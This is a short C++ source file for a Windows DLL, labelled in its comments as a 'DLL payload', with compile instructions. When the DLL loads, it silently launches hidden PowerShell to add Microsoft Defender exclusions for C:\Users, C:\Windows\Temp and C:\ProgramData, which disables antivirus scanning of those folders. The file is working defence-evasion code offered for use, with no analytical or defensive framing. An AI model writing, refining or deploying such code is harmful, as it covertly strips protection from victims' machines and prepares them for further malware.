#include <windows.h>
#include <stdio.h>

// DLL payload - adds Defender exclusions via Add-MpPreference
// Runs on DllMain attach, spawns hidden PowerShell
// Compile: cl exclusion_dll.cpp advapi32.lib /LD /Fe:exclusion.dll /EHsc /nologo

void AddExclusion(const wchar_t* path) {
    wchar_t cmd[512];
    swprintf_s(cmd, 512,
        L"powershell -WindowStyle Hidden -NonInteractive -Command \"Add-MpPreference -ExclusionPath '%s'\"",
        path);

    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {};

    if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 10000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);

        // Add exclusions via legitimate Defender API
        AddExclusion(L"C:\\Users");
        AddExclusion(L"C:\\Windows\\Temp");
        AddExclusion(L"C:\\ProgramData");
    }
    return TRUE;
}

// Compile: cl exclusion_dll.cpp advapi32.lib /LD /Fe:exclusion.dll /EHsc /nologo
